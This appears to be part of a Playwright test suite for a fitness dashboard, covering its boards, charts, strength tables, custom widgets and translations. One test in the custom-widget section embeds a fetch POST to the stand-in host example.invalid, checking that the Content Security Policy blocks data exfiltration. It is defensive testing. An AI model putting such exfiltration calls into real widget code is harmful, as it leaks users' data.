      avgHR: 140,
    };
    expect(await runningPace([treadmill, ...data.activities])).toBe(
      await runningPace(data.activities),
    );
  });

  it("totals the window", async () => {
    const { page } = await open(browser, pageFile());
    const km = data.activities.reduce((s: number, a: { km?: number }) => s + (a.km ?? 0), 0);
    expect(await page.textContent(".totals")).toContain(`${km.toFixed(1)} km`);
    expect(await page.textContent(".totals")).toContain("75 sessions");
  });

  it("gives a readiness verdict from its four inputs", async () => {
    const { page } = await open(browser, pageFile());
    expect(await page.textContent(".verdict")).toMatch(/^(Go easy|Ready to push|Normal)$/);
    expect(await page.$$eval("[data-id=readiness] .kpi", (k) => k.length)).toBe(4);
  });

  it("shows a calendar day with its activities on hover", async () => {
    const { page } = await open(browser, pageFile());
    await page.hover("[data-date='2026-10-17']");
    const tip = await page.textContent(".cal-tip");
    expect(tip).toContain("Riverside Half Marathon");
    expect(await page.isVisible(".cal-tip")).toBe(true);
  });

  it("keeps one tab stop in the calendar of an older window", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#all@2026-08-03_2026-08-31" });
    const stops = await page.$$eval("[data-id=calendar] .cal-cell[tabindex='0']", (c) =>
      c.map((x) => x.getAttribute("data-date")),
    );
    // the Sunday of the window's last week
    expect(stops).toEqual(["2026-09-06"]);
  });

  it("shows n/a without a unit for a missing distance", async () => {
    const swim = {
      id: 9200,
      name: "Open water, no distance",
      type: "open_water_swimming",
      sport: "swimming",
      start: "2026-10-24 07:00:00",
      duration: "30:00",
    };
    const { page } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: [swim, ...data.activities] } }),
      { hash: "#swimming" },
    );
    const cells = await page.$$eval("[data-id=swimDetails] tbody tr:first-child td", (c) =>
      c.map((x) => x.textContent),
    );
    expect(cells[2]).toBe("n/a");
    expect(cells[3]).toBe("n/a");
  });

  it("lists the activities, and opens and closes their laps", async () => {
    const { page } = await open(browser, pageFile());
    const rows = () =>
      page.$$eval(
        "[data-id=activities] table.data > tbody > tr:not(.laps-row):not([hidden])",
        (r) => r.length,
      );
    expect(await rows()).toBe(15);
    await page.click("text=Show all 75");
    expect(await rows()).toBe(75);
    // the browser keeps the choice
    await page.reload();
    await page.waitForSelector(".page");
    expect(await rows()).toBe(75);
    await page.click("text=Show fewer");
    expect(await rows()).toBe(15);
    const button = "[data-id=activities] button[aria-expanded]";
    await page.click(button);
    expect(await page.$$eval(".laps-row", (r) => r.length)).toBe(1);
    await page.click(`${button}[aria-expanded=true]`);
    expect(await page.$$eval(".laps-row", (r) => r.length)).toBe(0);
  });

  it("colours a change only when one direction is better", async () => {
    const { page } = await open(browser, pageFile());
    const deltas = await page.$$eval("[data-id=kpis] .delta", (els) =>
      els.map((e) => [e.className.trim(), e.textContent]),
    );
    // distance and time: an arrow, no colour; HRV: lower is worse, and says so
    expect(deltas).toEqual([
      ["delta", "▼ 11%"],
      ["delta", "▲ 8%"],
      ["delta bad", "▼ 4% (worse)"],
    ]);
    // "Normal" readiness is no warning
    const color = (sel: string) => page.$eval(sel, (e) => getComputedStyle(e).color);
    expect(await color(".verdict-normal")).toBe(await color("h1"));
  });

  it("shows four records, and all of them on Show all", async () => {
    const { page } = await open(browser, pageFile());
    const shown = () =>
      page.$$eval("[data-id=records] .badge:not([hidden]) .kpi-label", (b) =>
        b.map((x) => x.textContent),
      );
    expect(await shown()).toEqual([
      "Fastest half marathon",
      "Longest run",
      "Longest ride",
      "Best est. 1RM · Barbell Back Squat",
    ]);
    await page.click("[data-id=records] >> text=Show all 16");
    expect(await shown()).toHaveLength(16);
    expect(await page.getAttribute("[data-id=records] .more", "aria-expanded")).toBe("true");
  });

  it("shows the fitness age components behind Details", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#recovery" });
    expect(await page.isVisible("[data-id=fitnessAge] table")).toBe(false);
    await page.click("[data-id=fitnessAge] summary");
    expect(await page.isVisible("[data-id=fitnessAge] table")).toBe(true);
  });

  it("switches the weekly volume between time, distance, sessions and load", async () => {
    const { page } = await open(browser, pageFile());
    const axis = () =>
      page.evaluate(() => {
        const c = Object.values(window.Chart!.instances).find((x) =>
          x.canvas.closest("[data-id=weeklyVolume]"),
        )!;
        return (c.options.scales!.y as { title: { text: string } }).title.text;
      });
    expect(await axis()).toBe("h");
    await page.click("[data-id=weeklyVolume] .picker >> text=Distance");
    expect(await axis()).toBe("km");
  });

  it("shows the widgets in Italian", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({ settings: { languages: ["en", "it"] } }),
      { locale: "it-IT" },
    );
    expect(await page.textContent("[data-id=readiness] h2")).toBe("Prontezza di oggi");
    expect(await page.textContent(".totals")).toContain("sessioni");
    expect(errors).toEqual([]);
  });
});

describe("type boards", () => {
  it("draws every board without errors, with a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, pageFile());
    for (const tab of ["recovery", "running", "strengthTraining", "walking", "cycling", "racket"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await chartsWithoutTooltip(page)]).toEqual([tab, []]);
    }
    expect(errors).toEqual([]);
  });

  it("has a Recovery board with one note for its 14-day widgets", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#recovery" });
    expect(await tiles(page)).toEqual([
      "readiness",
      "fitnessAge",
      "loadVsRecovery",
      "hrv",
      "restingHr",
      "sleep",
      "sleepNeed",
      "bedtime",
      "bodyBattery",
    ]);
    expect(await page.textContent(".board-note")).toContain("last 14 days");
    expect(await page.$$eval(".tile .note", (els) => els.map((e) => e.textContent))).not.toContain(
      "Last 14 days: the week window does not change it.",
    );
  });

  it("fits every board on a phone", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    for (const tab of ["all", "running", "strengthTraining", "walking", "cycling", "racket"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([
        tab,
        await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
      ]).toEqual([tab, true]);
    }
  });

  it("shows the Run widgets", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#running" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "bestEfforts",
      "races",
      "aerobicFitness",
      "intensityShare",
      "runningForm",
      "runWalk",
      "trainingEffect",
      "racePredictor",
      "longRuns",
      "activities",
    ]);
    const races = await page.$$eval("[data-id=races] tbody tr", (r) =>
      r.map((x) => x.children[1].textContent),
    );
    expect(races).toEqual(["Riverside Half Marathon", "City 10K"]);
    expect(await page.$$eval("[data-id=racePredictor] .kpi", (k) => k.length)).toBe(4);
    expect(await page.textContent("[data-id=racePredictor]")).toContain("Estimate (Riegel)");
    // a small multiple for each running form metric in the data
    expect(await page.$$eval("[data-id=runningForm] .multiple", (m) => m.length)).toBe(7);
  });

  it("says one session so far instead of a trend", async () => {
    const ride = data.activities.find((a: { type: string }) => a.type === "cycling");
    const { page } = await open(
      browser,
      pageFile({ data: { ...data, activities: [ride], v: DASHBOARD_VERSION } }),
      { hash: "#cycling" },
    );
    expect(await page.textContent("[data-id=typeWeekly]")).toContain("One session so far");
    expect(await page.textContent("[data-id=typeKpis]")).toContain("One session so far");
  });
});

const rows = (page: Page) =>
  page.$$eval(".ex-row", (r) => r.map((x) => x.firstElementChild!.textContent));

describe("strength board", () => {
  it("shows the Strength widgets", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "setsPerCategory",
      "muscleBalance",
      "exercises",
      "strengthSessions",
    ]);
    expect(await rows(page)).toHaveLength(9);
    expect(await page.textContent("[data-id=muscleBalance]")).toMatch(
      /Push : pull sets\s*[\d.]+ : 1/,
    );
    expect(errors).toEqual([]);
  });

  it("searches, filters by group, and a second click on the chip shows all groups", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    await page.fill(".search", "squat");
    expect(await rows(page)).toEqual(["Barbell Back Squat"]);
    await page.fill(".search", "");
    await page.click("[data-id=exercises] .chips >> text=Shoulders");
    expect(await rows(page)).toEqual(["Dumbbell Shoulder Press"]);
    await page.click("[data-id=exercises] .chips >> text=Shoulders");
    expect(await rows(page)).toHaveLength(9);
  });

  it("sorts by a column, and a second click turns the order", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const sort = () => page.getAttribute("[data-id=exercises] th[aria-sort]", "aria-sort");
    await page.click("[data-id=exercises] .sort >> text=Best est. 1RM");
    expect(await sort()).toBe("descending");
    await page.click("[data-id=exercises] .sort >> text=Best est. 1RM");
    expect(await sort()).toBe("ascending");
  });

  it("opens an exercise with a name in another script, and keeps it in the hash", async () => {
    const renamed: Record<string, string> = { Plank: "Планка", "Lat Pulldown": "腹筋" };
    const activities = data.activities.map((a: Record<string, unknown>) =>
      Array.isArray(a.exercises)
        ? {
            ...a,
            exercises: a.exercises.map((e: { exercise: string }) => ({
              ...e,
              exercise: renamed[e.exercise] ?? e.exercise,
            })),
          }
        : a,
    );
    const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } });
    const { page, errors } = await open(browser, file, { hash: "#strengthTraining" });
    await page.click("[data-exercise='腹筋']");
    expect(await page.textContent(".detail h3")).toBe("腹筋");
    expect(decodeURIComponent(await hash(page))).toMatch(/\/腹筋$/);
    expect(await page.getAttribute("[data-exercise='планка']", "data-exercise")).toBe("планка");

    const again = await open(browser, file, { hash: await hash(page) });
    expect(await again.page.textContent(".detail h3")).toBe("腹筋");
    expect(errors).toEqual([]);
  });

  it("opens an exercise with a click or Enter, keeps it in the hash, and closes it with a second click", async () => {
    const file = pageFile();
    const { page, errors } = await open(browser, file, { hash: "#strengthTraining" });
    await page.click("[data-exercise=barbell-back-squat]");
    expect(await hash(page)).toMatch(/^#strengthTraining@.+\/barbell-back-squat$/);
    expect(await page.textContent(".detail h3")).toBe("Barbell Back Squat");
    expect(await page.$$eval(".detail .ex-sessions > li", (l) => l.length)).toBe(12);
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    await page.click("[data-exercise=barbell-back-squat]");
    expect(await page.$(".detail")).toBeNull();

    await page.focus("[data-exercise=plank] button");
    await page.keyboard.press("Enter");
    expect(await page.textContent(".detail h3")).toBe("Plank");
    // focus goes to the detail, which opens after the table
    expect(await page.evaluate(() => document.activeElement?.textContent)).toBe("Plank");

    const again = await open(browser, file, {
      hash: "#strengthTraining@2026-08-03_2026-10-26/lat-pulldown",
    });
    expect(await again.page.textContent(".detail h3")).toBe("Lat Pulldown");
    expect(errors).toEqual([]);
  });

  it("opens and closes a session", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const first = "[data-id=strengthSessions] details >> nth=0";
    await page.click(`${first} >> summary`);
    expect(await page.getAttribute(first, "open")).toBe("");
    await page.click(`${first} >> summary`);
    expect(await page.getAttribute(first, "open")).toBeNull();
  });

  it("shows the last six sessions first, newest on top", async () => {
    const { page } = await open(browser, pageFile(), { hash: "#strengthTraining" });
    const summaries = () =>
      page.$$eval("[data-id=strengthSessions] details:not([hidden]) summary", (s) =>
        s.map((x) => x.textContent),
      );
    const shown = await summaries();
    expect(shown).toHaveLength(6);
    expect(shown[0]).toMatch(/^Oct 23/);
    await page.click("[data-id=strengthSessions] >> text=Show all 24");
    expect(await summaries()).toHaveLength(24);
  });
});

describe("walk, hike, bike, swim and racket sport boards", () => {
  const hike = {
    id: 9001,
    name: "Ridge Hike",
    type: "hiking",
    sport: "hiking",
    start: "2026-10-25 09:00:00",
    km: 12,
    duration: "3:00:00",
    ascentM: 900,
    avgHR: 120,
    maxHR: 150,
    trainingLoad: 120,
  };
  const swim = {
    id: 9002,
    name: "Pool Swim",
    type: "lap_swimming",
    sport: "swimming",
    start: "2026-10-24 07:00:00",
    km: 1.5,
    duration: "30:00",
    swolf: 38,
    lengths: 60,
    strokes: 900,
    poolLengthM: 25,
    avgHR: 130,
    trainingLoad: 40,
  };
  const tennis = {
    id: 9004,
    name: "Club Tennis",
    type: "tennis",
    sport: "racket",
    start: "2026-10-22 19:00:00",
    duration: "40:00",
    elapsed: "1:30:00",
    avgHR: 140,
    maxHR: 178,
    trainingLoad: 95,
  };
  // no SDK sport known for this type: it goes to the Other board
  const yoga = {
    id: 9003,
    name: "Yoga",
    type: "yoga",
    start: "2026-10-23 19:00:00",
    duration: "45:00",
    avgHR: 90,
  };
  const ski = {
    id: 9005,
    name: "Ski Day",
    type: "resort_skiing",
    sport: "alpineSkiing",
    start: "2026-10-21 10:00:00",
    km: 30,
    duration: "3:00:00",
    avgHR: 120,
  };
  const more = () =>
    pageFile({
      data: {
        ...data,
        v: DASHBOARD_VERSION,
        activities: [hike, swim, yoga, tennis, ski, ...data.activities],
      },
    });

  it("adds a tab for each other sport in the data, and the Other tab last", async () => {
    const { page } = await open(browser, more());
    expect((await tabs(page)).map(([tab]) => tab)).toEqual([
      "all",
      "recovery",
      "running",
      "strengthTraining",
      "walking",
      "hiking",
      "cycling",
      "swimming",
      "racket",
      "alpineSkiing",
      "generic",
    ]);
    expect(await page.textContent("[data-tab=alpineSkiing] span")).toBe("Alpine skiing");
    expect(await page.textContent("[data-tab=generic] span")).toBe("Other");
  });

  it("gives a new sport the board of the Other tab", async () => {
    const { page, errors } = await open(browser, more(), { hash: "#alpineSkiing" });
    expect(await tiles(page)).toEqual(["typeKpis", "typeWeekly", "hrZones", "activities"]);
    expect(await page.textContent("[data-tab=alpineSkiing] .count")).toBe("1");
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("draws the bars and the period row of another sport", async () => {
    // a board with a single session shows a note instead of the chart, so give it two
    const two = pageFile({
      data: {
        ...data,
        v: DASHBOARD_VERSION,
        activities: [{ ...ski, id: 9006, start: "2026-10-14 10:00:00" }, ski, ...data.activities],
      },
    });
    const { page, errors } = await open(browser, two, { hash: "#alpineSkiing" });
    const bars = await page.evaluate(() => {
      const c = Object.values(window.Chart!.instances).find((x) =>
        x.canvas.closest("[data-widget=typeWeekly]"),
      )!;
      return c.data.datasets.filter((d) => d.type === "bar").map((d) => d.label);
    });
    expect(bars).toEqual(["Alpine skiing"]);
    await page.click("[data-tab=all]");
    expect(await page.textContent("[data-widget=periodComparison]")).toContain("Alpine skiing");
    expect(errors).toEqual([]);
  });

  it("adds a widget to another sport's board with that sport as its type", async () => {
    const { page } = await open(browser, more(), { hash: "#alpineSkiing" });
    await startEdit(page);
    await page.click(".edit-bar >> text=Add widget");
    const select = page.locator(".catalogue li:has-text('Weekly volume') select");
    expect(await select.inputValue()).toBe("alpineSkiing");
  });

  it("draws every extra board without errors, with a tooltip on every chart", async () => {
    const { page, errors } = await open(browser, more());
    for (const tab of ["walking", "hiking", "cycling", "swimming", "racket", "generic"]) {
      await page.click(`[data-tab=${tab}]`);
      expect([tab, await chartsWithoutTooltip(page)]).toEqual([tab, []]);
    }
    expect(errors).toEqual([]);
  });

  it("gives the numbers of each sport", async () => {
    const { page } = await open(browser, more(), { hash: "#hiking" });
    expect(await page.textContent("[data-id=hikeVertical]")).toContain("300 m/h");
    await page.click("[data-tab=swimming]");
    expect(await page.textContent("[data-id=swimDetails]")).toContain("2:00/100 m");
    await page.click("[data-tab=cycling]");
    expect(await page.textContent("[data-id=bikeDetails] .kpis")).toContain("3 rides");
    await page.click("[data-tab=racket]");
    // tennis and padel share the board; the sport column tells them apart
    const sports = await page.$$eval("[data-id=racketDetails] tbody tr", (r) =>
      r.map((x) => x.children[2].textContent),
    );
    // in the order of the data, where the test puts tennis first
    expect(sports).toEqual(["Tennis", "Padel", "Padel", "Padel"]);
    const numeric = await page.$$eval("[data-id=racketDetails] thead th", (th) =>
      th.map((x) => x.classList.contains("num")),
    );
    expect(numeric).toEqual([false, false, false, true, true, true, true, true, true, true, true]);
    expect(await page.textContent("[data-tab=racket] .count")).toBe("4");
    await page.click("[data-tab=walking]");
    expect(await tiles(page)).toEqual([
      "typeKpis",
      "typeWeekly",
      "hrZones",
      "walkDetails",
      "steps",
      "activities",
    ]);
  });
});

const noLoad = (a: Record<string, unknown>) => ({ ...a, trainingLoad: undefined });
const custom = (id: string, code: string) => ({ id, title: `Custom ${id}`, span: 1, code });
const on = (...ids: string[]) => ({
  rev: "c",
  base: "preset",
  boards: { all: ids.map((id) => ({ id, widget: id, span: 1 })) },
});

/** A custom widget that draws a chart of `type`. */
const chartOf = (type: string) =>
  `ctx.chart(el, { type: "${type}", data: { labels: ["a", "b"], datasets: [{ data: [1, 2] }] } });`;

describe("custom widgets and languages", () => {
  it("runs a custom widget with the widget API, chart and all", async () => {
    const code = `
      const p = document.createElement("p");
      p.className = "rides";
      p.textContent = ctx.activities.filter((a) => ctx.calc.groupOf(a) === "cycling").length + " rides </script>";
      el.append(p);
      ctx.chart(el, { type: "bar", data: { labels: ["a", "b"], datasets: [{ label: "x", data: [1, 2], backgroundColor: ctx.color("cycling") }] } });`;
    const { page, errors } = await open(
      browser,
      pageFile({ widgets: [custom("rides", code)], layout: on("rides") }),
    );
    expect(await page.textContent("[data-id=rides] h2")).toBe("Custom rides");
    expect(await page.textContent(".rides")).toBe("3 rides </script>");
    expect(await chartsWithoutTooltip(page)).toEqual([]);
    expect(errors).toEqual([]);
  });

  it("gives the notes to a custom widget as plain text", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        data: { ...data, v: DASHBOARD_VERSION, notes: ["Don&#39;t skip Z2 &amp; strides"] },
        widgets: [custom("note", "el.textContent = ctx.data.notes[0];")],
        layout: on("note"),
      }),
    );
    expect(await page.textContent("[data-id=note]")).toContain("Don't skip Z2 & strides");
    expect(errors).toEqual([]);
  });

  it("blocks a custom widget that sends data out", async () => {
    const code = `
      fetch("https://example.invalid/x", { method: "POST", body: "1" })
        .then(() => { el.textContent = "sent"; })
        .catch(() => { el.textContent = "blocked"; });`;
    const { page, errors } = await open(
      browser,
      pageFile({ widgets: [custom("leak", code)], layout: on("leak") }),
    );
    await page.waitForFunction(() =>
      document.querySelector("[data-id=leak]")?.textContent?.includes("blocked"),
    );
    expect(errors.join("\n")).toMatch(/Content Security Policy|Content-Security-Policy/);
  });

  it("shows n/a, not 0, for a load that no activity has", async () => {
    const noLoadData = {
      ...data,
      zones: null,
      activities: data.activities.map(noLoad),
      previousActivities: data.previousActivities.map(noLoad),
      v: DASHBOARD_VERSION,
      notes: [],
    };
    const { page, errors } = await open(browser, pageFile({ data: noLoadData }), {
      hash: "#running",
    });
    const load = page
      .locator(".kpi", { has: page.locator(".kpi-label", { hasText: "Garmin training load" }) })
      .first();
    expect(await load.textContent()).toContain("n/a");
    expect(errors).toEqual([]);
  });

  it("shows the error of a failing widget in its own tile only", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        widgets: [
          custom("broken", "throw new Error('no data here');"),
          custom("bad", "this is not code ("),
        ],
        layout: on("broken", "bad", "coachNotes"),
      }),
    );
    expect(await page.textContent("[data-id=broken] .error")).toContain("no data here");
    expect(await page.textContent("[data-id=bad] .error")).toContain("This widget failed");
    expect(await page.textContent("[data-id=coachNotes] .notes")).toContain("Load");
    expect(errors).toEqual([]);
  });

  it("draws doughnut and pie charts, and shows an error for a chart type the page does not have", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        widgets: [
          custom("donut", chartOf("doughnut")),
          custom("cake", chartOf("pie")),
          custom("radar", chartOf("radar")),
        ],
        layout: on("donut", "cake", "radar"),
      }),
    );
    expect(
      await page.$$eval("[data-id=donut] canvas, [data-id=cake] canvas", (c) => c.length),
    ).toBe(2);
    expect(await page.textContent("[data-id=radar] .error")).toContain("radar");
    expect(errors).toEqual([]);
  });

  it("offers custom widgets in the catalogue", async () => {
    const { page } = await open(
      browser,
      pageFile({ widgets: [custom("mine", "el.textContent = 'mine';")], layout: on("coachNotes") }),
    );
    await startEdit(page);
    await page.click("text=Add widget");
    await page.click(".catalogue li:has-text('Custom mine') button");
    expect(await tiles(page)).toEqual(["coachNotes", "mine"]);
  });

  it("adds the languages of the page to the menu, with English for a missing text", async () => {
    const i18n = { de: { title: "Training + Erholung" }, it: { title: "Il mio allenamento" } };
    const { page } = await open(browser, pageFile({ i18n }), { locale: "it-IT" });
    // a page text replaces the built-in Italian one
    expect(await page.textContent("h1")).toBe("Il mio allenamento");
    expect(await page.$$eval("#lang option", (o) => o.map((x) => x.textContent))).toContain(
      "Deutsch",
    );
    await page.click(".account summary");
    await page.selectOption("#lang", "de");
    expect(await page.textContent("h1")).toBe("Training + Erholung");
    expect(await page.textContent("[data-id=readiness] h2")).toBe("Readiness today");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("de");
  });
});
